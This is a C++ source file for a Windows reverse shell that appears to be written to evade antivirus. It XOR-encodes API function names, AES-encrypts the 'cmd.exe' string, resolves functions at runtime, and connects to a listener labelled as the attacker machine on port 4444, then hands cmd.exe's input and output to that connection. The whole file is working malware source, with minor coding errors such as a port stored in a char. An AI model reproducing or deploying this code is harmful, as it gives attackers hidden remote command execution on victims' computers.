#include <winsock2.h>
#include <stdio.h>
#include <iostream>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

//function declaration
int (WINAPI* pWSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
int (WINAPI* pWSAConnect)(SOCKET s, const struct sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
BOOL(WINAPI* pCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

//<==================Encrypted function==============>//
//CreateProcess encrypted
unsigned char cCreateProcessA[] = { 0x28, 0x1b, 0xe, 0x8, 0x1f, 0xc, 0x3b, 0x1b, 0x4, 0xa, 0xe, 0x1a, 0x18, 0x28 };
unsigned int cCreateProcessA_len = sizeof(cCreateProcessA);
//WSAStartup Encrypted
unsigned char cWSAStartup[] = { 0x3c, 0x3a, 0x2a, 0x3a, 0x1f, 0x8, 0x19, 0x1d, 0x1e, 0x19 };
unsigned int cWSAStartup_len = sizeof(cWSAStartup);
//WSAConnect Encrypted
unsigned char cWSAConnect[] = { 0x3c, 0x3a, 0x2a, 0x2a, 0x4, 0x7, 0x5, 0xc, 0x8, 0x1d };
unsigned int cWSAConnect_len = sizeof(cWSAConnect);



char my_key[] = "kiki";
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1)
            j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

//encrypted command cmd.exe
unsigned char myCmd[] = { 0x98, 0xa7, 0xef, 0x3b, 0x8f, 0xdb, 0x21, 0x2b, 0x1c, 0xa2, 0xf3, 0x12, 0x3f, 0x55, 0x29, 0xf7 };
unsigned int myCmdL = sizeof(myCmd);


//AES key
unsigned char mySecretKey[] = { 0xae, 0x55, 0x61, 0xd5, 0xf0, 0x2, 0x8e, 0xb, 0x2d, 0x77, 0x3, 0x1f, 0x63, 0xec, 0x95, 0x97 };
int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen){
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if(!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if(!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;
    }
    if(!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)){
        return -1;
    }
    if(!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, data, &data_len)){
        return -1;
    }
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    return 0;
}
int main(int argc, char* argv[]){
    //decrypt command
    XOR((char *)cCreateProcessA, cCreateProcessA_len, my_key, sizeof(my_key));
    XOR((char *)cWSAConnect, cWSAConnect_len, my_key, sizeof(my_key));
    XOR((char *)cWSAStartup, cWSAStartup_len, my_key, sizeof(my_key));
    AESDecrypt((char *) myCmd, myCmdL, mySecretKey, sizeof(mySecretKey)); 
    //listener ip, port on attacker machine
    char *ip = "192.168.100.143";
    char port = 4444;
    //init socket lib
    pWSAStartup = GetProcAddress(GetModuleHandle("ws2_32.dll"), cWSAStartup);
    pWSAStartup(MAKEWORD(2, 2), &wsaData);
    //create a socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);
    //connect to remote hhost
    pWSAConnect = GetProcAddress(GetModuleHandle("ws2_32.dll"), cWSAConnect);
    pWSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb= sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; 

    char command[8] = "";
    snprintf( command, sizeof(command), "%s", myCmd); 

    //start cmd with redirected streams
    pCreateProcessA = GetProcAddress(GetModuleHandle("kernel32.dll"), cCreateProcessA);
    pCreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    exit(0);
}